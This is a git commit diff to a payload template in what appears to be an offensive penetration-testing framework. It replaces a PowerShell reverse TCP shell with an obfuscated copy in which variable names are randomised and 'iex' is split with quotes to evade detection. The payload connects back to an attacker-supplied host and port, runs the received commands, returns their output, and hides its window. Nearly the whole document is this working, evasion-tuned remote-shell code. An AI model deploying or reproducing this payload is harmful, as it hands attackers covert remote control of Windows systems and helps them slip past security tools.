0e75e9895269b85db580a4e80f270c86131febb7
Addam Lister <80731295+AddamLister@users.noreply.github.com>
2023-11-29 23:11:24 +0800

    Update powershell_reverse_tcp.py
    Obfuscated powershell_reverse_tcp.py

--- Core/payload_templates/windows/netcat/powershell_reverse_tcp.py
+++ Core/payload_templates/windows/netcat/powershell_reverse_tcp.py
@@ -24,6 +24,6 @@ class Payload:
     attrs = {
         'encode' : True
     }
-
-    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"
+   
+    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$8760b98e984a48d293a47c05245a640f = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$8d3b8179bcf343149c7f04476bd1e701 = $8760b98e984a48d293a47c05245a640f.GetStream();[byte[]]$86ce3a33d33642bbbf2a16a7b175e7e2 = 0..65535|%{0};while(($i = $8d3b8179bcf343149c7f04476bd1e701.Read($86ce3a33d33642bbbf2a16a7b175e7e2, 0, $86ce3a33d33642bbbf2a16a7b175e7e2.Length)) -ne 0){;$48fd3c52e8924aefbf56b277f16fc6fc = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($86ce3a33d33642bbbf2a16a7b175e7e2,0, $i);$f136ee90168144f38916d49b801466fa = (i""e''x $48fd3c52e8924aefbf56b277f16fc6fc 2>&1 | Out-String );$f136ee90168144f38916d49b801466fa2 = $f136ee90168144f38916d49b801466fa + 'PS ' + $(gl).Path + '> ';$4658346d8920458e9efda3aae4d013c8 = ([text.encoding]::ASCII).GetBytes($f136ee90168144f38916d49b801466fa2);$8d3b8179bcf343149c7f04476bd1e701.Write($4658346d8920458e9efda3aae4d013c8,0,$4658346d8920458e9efda3aae4d013c8.Length);$8d3b8179bcf343149c7f04476bd1e701.Flush()};$8760b98e984a48d293a47c05245a640f.Close()} -WindowStyle Hidden"
     
